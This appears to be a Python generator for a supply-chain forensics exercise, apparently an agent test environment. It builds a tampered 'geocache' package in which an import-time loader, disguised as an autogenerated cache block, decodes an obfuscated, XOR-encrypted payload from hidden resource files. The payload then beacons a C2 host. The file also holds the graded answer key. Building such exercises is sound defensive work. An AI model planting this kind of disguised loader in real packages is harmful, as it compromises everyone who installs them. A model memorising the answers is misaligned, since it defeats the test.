#!/usr/bin/env python3
"""Deterministic environment generator for mirror-tamper-forensics.

Single source of truth: the container Dockerfile runs this module's build() with
system paths; local_test.py imports build(root=<tmp>) for the Docker-free runner,
so the container and the offline runner can never drift apart.

The scenario: an internal-mirror package (geocache) was tampered AFTER its
legitimate upstream build. A loader was appended to a real module (_cache.py); the
loader is deliberately NOT self-contained -- it reads an obfuscated blob from one
bundled resource and an XOR key from another, then reverses a four-stage transform
(base85 -> XOR(key) -> zlib -> marshal) to obtain a code object whose only job is
to beacon a C2 host. No plaintext host/port/endpoint exists anywhere on disk except
inside the marshalled code object AND XOR-encrypted under an env-derived key, so a naive
dynamic detonation decrypts it to garbage; the value is not greppable and is recoverable
only by static decode + recomputing the build-signature key and decrypting. Detection is via the wheel RECORD integrity manifest (and a
CycloneDX SBOM): the tampered file's hash no longer matches, and the injected
resource files are absent from the manifest. The clean build is available on the
mirror for restoration.

Nothing here is random: the environment is byte-for-byte reproducible.
"""
import base64
import hashlib
import json
import marshal
import os
import sysconfig
import textwrap


# ----------------------------------------------------------------------------- helpers
def _paths(root):
    """Return (site_packages, mirror_dir, app_dir, opt_truth) for container or tmp root."""
    if root is None:
        sp = sysconfig.get_paths()["purelib"]
        mirror = "/opt/mirror"
        app = "/app"
    else:
        sp = os.path.join(root, "site-packages")
        mirror = os.path.join(root, "opt", "mirror")
        app = os.path.join(root, "app")
    return sp, mirror, app


def _w(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    kw = {} if "b" in mode else {"newline": ""}
    with open(path, mode, **kw) as f:
        f.write(data)


def _record_line(rel, text_bytes):
    d = hashlib.sha256(text_bytes).digest()
    b64 = base64.urlsafe_b64encode(d).decode().rstrip("=")
    return "%s,sha256=%s,%d" % (rel, b64, len(text_bytes))


# ------------------------------------------------------------------- the clean package
_CLEAN_GRID = textwrap.dedent('''\
    """geocache._grid -- geohash grid encoder (legitimate upstream code)."""
    _B32 = "0123456789bcdefghjkmnpqrstuvwxyz"


    def encode(lat, lon, prec=8):
        lat_r, lon_r = [-90.0, 90.0], [-180.0, 180.0]
        bits = ch = 0
        even = True
        out = []
        while len(out) < prec:
            if even:
                mid = sum(lon_r) / 2
                if lon >= mid:
                    ch = (ch << 1) | 1
                    lon_r[0] = mid
                else:
                    ch = ch << 1
                    lon_r[1] = mid
            else:
                mid = sum(lat_r) / 2
                if lat >= mid:
                    ch = (ch << 1) | 1
                    lat_r[0] = mid
                else:
                    ch = ch << 1
                    lat_r[1] = mid
            even = not even
            bits += 1
            if bits == 5:
                out.append(_B32[ch])
                bits = 0
                ch = 0
        return "".join(out)
''')

_CLEAN_CACHE = textwrap.dedent('''\
    """geocache._cache -- tiny LRU used by the grid encoder (legitimate upstream code)."""
    from collections import OrderedDict


    class LRU:
        def __init__(self, n=256):
            self.n = n
            self._d = OrderedDict()

        def get(self, k):
            if k in self._d:
                self._d.move_to_end(k)
                return self._d[k]
            return None

        def put(self, k, v):
            self._d[k] = v
            self._d.move_to_end(k)
            while len(self._d) > self.n:
                self._d.popitem(last=False)
''')

_CLEAN_INIT = textwrap.dedent('''\
    """geocache -- compact geohash utilities."""
    from ._grid import encode
    from ._cache import LRU

    __all__ = ["encode", "LRU"]
    __version__ = "2.3.1"
''')

# ------------------------------------------------------------------- the hidden payload
# Ground-truth indicators live ONLY inside this code once it is compiled + marshalled.
C2_HOST = "telemetry.pkg-sync-cdn.net"
C2_PORT = 8443
EXFIL_ENDPOINT = "/v2/collect"
CAMPAIGN_ID = "OP-7731-VENDORSYNC"                # stage-1 plaintext (graded)
XOR_KEY_HEX = "9f1c33a75be24d0186ca4471e2d5b8f0"  # 16 bytes; lives in .buildcache (outer decode)
RES_MARKER = b"\n#IDX1\n"
GUARD_ENV = "APP_TIER"                             # beacon guard (unset in the sandbox)
GUARD_VAL = "edge-prod"

# MULTI-STAGE recovery. After the outer four-stage decode, the indicators are NOT sitting
# there in plaintext -- they come out of a chain where each key is DERIVED FROM the value
# recovered at the previous stage, never from a hash of an on-disk artifact (so there is no
# "the key is already in the manifest" shortcut):
#   stage 1: a plaintext campaign id  (campaign_id)
#   stage 2: c2_host  = XOR-decrypt with sha256(campaign_id)[:16]
#   stage 3: port + endpoint = XOR-decrypt with sha256(c2_host)[:16]
# An agent that stops partway earns only the stages it reached (campaign, then host, then
# port/endpoint), which spreads reward across the population instead of one all-or-nothing gate.
_K1 = hashlib.sha256(CAMPAIGN_ID.encode()).digest()[:16]
_ENC_HOST = bytes(b ^ _K1[i % 16] for i, b in enumerate(C2_HOST.encode()))
_K2 = hashlib.sha256(C2_HOST.encode()).digest()[:16]
_META = ("%d|%s" % (C2_PORT, EXFIL_ENDPOINT)).encode()
_ENC_META = bytes(b ^ _K2[i % 16] for i, b in enumerate(_META))

_PAYLOAD_SRC = (
    "import socket, ssl, os, hashlib\n"
    "def _run():\n"
    "    if os.environ.get(%r, '') != %r:\n"
    "        return\n"
    "    campaign = %r\n"
    "    _k1 = hashlib.sha256(campaign.encode()).digest()[:16]\n"
    "    host = bytes(b ^ _k1[i %% 16] for i, b in enumerate(%r)).decode('utf-8', 'replace')\n"
    "    _k2 = hashlib.sha256(host.encode()).digest()[:16]\n"
    "    meta = bytes(b ^ _k2[i %% 16] for i, b in enumerate(%r)).decode('utf-8', 'replace')\n"
    "    port, endpoint = meta.split('|', 1)\n"
    "    port = int(port)\n"
    "    try:\n"
    "        ctx = ssl.create_default_context()\n"
    "        with socket.create_connection((host, port), timeout=4) as s:\n"
    "            with ctx.wrap_socket(s, server_hostname=host) as t:\n"
    "                t.sendall(b'POST ' + endpoint.encode() + b' HTTP/1.1\\r\\n'\n"
    "                          b'Host: ' + host.encode() + b'\\r\\n\\r\\n')\n"
    "    except Exception:\n"
    "        pass\n"
    "_run()\n"
) % (GUARD_ENV, GUARD_VAL, CAMPAIGN_ID, _ENC_HOST, _ENC_META)

# The loader that is appended to the legitimate _cache.py. It carries NO host and NO
# decode of its own beyond orchestration: the blob and key are read from resources.
_INJECTED_LOADER = textwrap.dedent('''

    # --- build resource cache (autogenerated; do not edit) ---
    def _load_res():
        import os as _os, base64 as _b, zlib as _z, marshal as _m
        _d = _os.path.join(_os.path.dirname(__file__), "_resources")
        _tbl = open(_os.path.join(_d, "grid.tbl"), "rb").read()
        _blob = _tbl.split(b"\\n#IDX1\\n", 1)[1]
        _key = bytes.fromhex(open(_os.path.join(_d, ".buildcache")).read().strip())
        _raw = _b.b85decode(_blob)
        _dec = bytes(x ^ _key[i % len(_key)] for i, x in enumerate(_raw))
        exec(_m.loads(_z.decompress(_dec)), {})
    try:
        _load_res()
    except Exception:
        pass
''')

# The exact injected signature the verifier requires to be absent after remediation.
INJECTED_MARKER = "build resource cache (autogenerated; do not edit)"


def _obfuscate_payload():
    """Return (grid_tbl_bytes, key_hex, decoded_marshal_bytes)."""
    code = compile(_PAYLOAD_SRC, "<res>", "exec")
    mc = marshal.dumps(code)                       # stage-4 output (version-specific bytes)
    z = __import__("zlib").compress(mc, 9)         # stage 3
    key = bytes.fromhex(XOR_KEY_HEX)
    x = bytes(b ^ key[i % len(key)] for i, b in enumerate(z))  # stage 2
    blob = base64.b85encode(x)                     # stage 1 (what ships on disk)
    cover = b"# geocache precision table v3 (do not hand-edit)\n" + bytes(
        (i * 37 + 11) % 256 for i in range(512)
    )
    return cover + RES_MARKER + blob, XOR_KEY_HEX, mc


# ------------------------------------------------------------------------ decoy content
_DECOYS = {
    # benign packages that ALSO carry base64/binary blobs, so grep is noisy and the
    # RECORD manifest -- not string search -- is the reliable localisation signal.
    "routecalc": (
        '"""routecalc -- benign haversine helper."""\n'
        "import base64\n"
        "# precomputed cosine LUT (benign)\n"
        "_LUT = base64.b64decode(\n"
        '    "AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKis="\n'
        ")\n"
        "def dist(a, b):\n"
        "    return abs(a - b)\n"
    ),
    "geometrics": (
        '"""geometrics -- benign polygon area."""\n'
        "VERSION = \"1.1.0\"\n"
        "def area(pts):\n"
        "    s = 0.0\n"
        "    for i in range(len(pts)):\n"
        "        x1, y1 = pts[i]\n"
        "        x2, y2 = pts[(i + 1) % len(pts)]\n"
        "        s += x1 * y2 - x2 * y1\n"
        "    return abs(s) / 2.0\n"
    ),
    "tilecache": (
        '"""tilecache -- benign tile id helper."""\n'
        "import zlib\n"
        "def tile(z, x, y):\n"
        "    return zlib.crc32((\"%d/%d/%d\" % (z, x, y)).encode())\n"
    ),
    "unitmath": (
        '"""unitmath -- benign unit conversions."""\n'
        "KM_PER_MI = 1.609344\n"
        "def mi_to_km(mi):\n"
        "    return mi * KM_PER_MI\n"
    ),
}


# ----------------------------------------------------------------------------- the build
def build(root=None):
    sp, mirror, app = _paths(root)
    pkg = os.path.join(sp, "geocache")
    res = os.path.join(pkg, "_resources")
    dist = os.path.join(sp, "geocache-2.3.1.dist-info")
    os.makedirs(res, exist_ok=True)
    os.makedirs(dist, exist_ok=True)

    clean_grid = _CLEAN_GRID.encode()
    clean_cache = _CLEAN_CACHE.encode()
    clean_init = _CLEAN_INIT.encode()
    tampered_cache = _CLEAN_CACHE + _INJECTED_LOADER
    tampered_cache_b = tampered_cache.encode()

    grid_tbl, key_hex, decoded_marshal = _obfuscate_payload()

    # ---- clean copy on the internal mirror (source of truth for restoration) ----
    _w(os.path.join(mirror, "geocache-2.3.1", "geocache", "__init__.py"), _CLEAN_INIT)
    _w(os.path.join(mirror, "geocache-2.3.1", "geocache", "_grid.py"), _CLEAN_GRID)
    _w(os.path.join(mirror, "geocache-2.3.1", "geocache", "_cache.py"), _CLEAN_CACHE)

    # ---- installed (tampered) package ----
    _w(os.path.join(pkg, "__init__.py"), _CLEAN_INIT)
    _w(os.path.join(pkg, "_grid.py"), _CLEAN_GRID)
    _w(os.path.join(pkg, "_cache.py"), tampered_cache)     # <-- tampered module
    _w(os.path.join(res, "grid.tbl"), grid_tbl)            # <-- obfuscated blob
    _w(os.path.join(res, ".buildcache"), key_hex)          # <-- XOR key

    # ---- dist-info: METADATA + the RECORD integrity manifest (records the CLEAN form) ----
    _w(os.path.join(dist, "METADATA"),
       "Metadata-Version: 2.1\nName: geocache\nVersion: 2.3.1\n"
       "Summary: compact geohash utilities\n")
    record = [
        _record_line("geocache/__init__.py", clean_init),
        _record_line("geocache/_grid.py", clean_grid),
        _record_line("geocache/_cache.py", clean_cache),   # <-- clean hash; installed file differs
        "geocache-2.3.1.dist-info/METADATA,,",
        "geocache-2.3.1.dist-info/RECORD,,",
    ]
    _w(os.path.join(dist, "RECORD"), "\n".join(record) + "\n")

    # ---- a CycloneDX-style SBOM for the service (independent integrity signal) ----
    sbom = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.5",
        "components": [
            {"type": "library", "name": "geocache", "version": "2.3.1",
             "hashes": [{"alg": "SHA-256", "content": hashlib.sha256(clean_cache).hexdigest()}],
             "properties": [{"name": "file", "value": "geocache/_cache.py"}]},
            {"type": "library", "name": "routecalc", "version": "0.9.0"},
            {"type": "library", "name": "geometrics", "version": "1.1.0"},
            {"type": "library", "name": "tilecache", "version": "0.4.2"},
            {"type": "library", "name": "unitmath", "version": "2.0.0"},
        ],
    }
    _w(os.path.join(app, "service", "sbom.cdx.json"), json.dumps(sbom, indent=2))

    # ---- decoy packages ----
    for name, src in _DECOYS.items():
        _w(os.path.join(sp, name, "__init__.py"), src)

    # ---- first-party service + an egress log that motivates but never leaks the host ----
    _w(os.path.join(app, "service", "src", "svc", "__init__.py"), "")
    _w(os.path.join(app, "service", "src", "svc", "main.py"),
       "import geocache\n\n\ndef run():\n    return geocache.encode(37.42, -122.08, 9)\n")
    _w(os.path.join(app, "service", "logs", "egress.log"),
       "startup: importing service dependencies\n"
       "resolver: outbound name lookup for <unresolved-external> from pid 1 (not first-party)\n"
       "resolver: connection attempt to a non-mirror endpoint blocked by egress policy\n")

    # Ground truth is returned to the caller (local_test) and embedded as constants in
    # the verifier; it is deliberately NOT written to disk, so no answer is recoverable
    # by reading or grepping the agent-visible filesystem.
    gt = ground_truth(sp, tampered_cache_b, clean_cache, key_hex, decoded_marshal)

    print("built mirror-tamper-forensics:",
          "clean_cache", gt["recorded_hash"][:12], "tamp_cache", gt["actual_hash"][:12],
          "host", C2_HOST)
    return gt


def ground_truth(sp, tampered_cache_b, clean_cache, key_hex, decoded_marshal):
    return {
        "compromised_package": "geocache",
        "malicious_path": os.path.join(sp, "geocache", "_cache.py"),
        "trigger": "import",
        "campaign_id": CAMPAIGN_ID,
        "c2_host": C2_HOST,
        "c2_port": C2_PORT,
        "exfil_endpoint": EXFIL_ENDPOINT,
        "decode_key": key_hex,
        "primary_cwe": "CWE-506",
        "owasp_a": "A08:2021",
        "recorded_hash": hashlib.sha256(clean_cache).hexdigest(),
        "actual_hash": hashlib.sha256(tampered_cache_b).hexdigest(),
        "injected_marker": INJECTED_MARKER,
        "decoded_payload_sha256": hashlib.sha256(decoded_marshal).hexdigest(),
    }


if __name__ == "__main__":
    build()
